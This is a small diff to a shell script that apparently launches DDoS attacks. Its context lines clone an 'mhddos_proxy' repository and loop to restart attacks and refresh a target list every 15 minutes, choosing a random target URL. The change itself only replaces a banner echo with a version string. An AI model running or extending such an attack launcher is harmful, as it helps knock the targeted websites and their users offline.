@@ -35,7 +35,7 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 
 # Restart attacks and update targets list every 15 minutes (by default)
 while true
-echo -e "#####################################\n"
+echo -e "VERSION 02052022\n"
 do
    
    random_url=$(shuf -i 1-3 -n1)
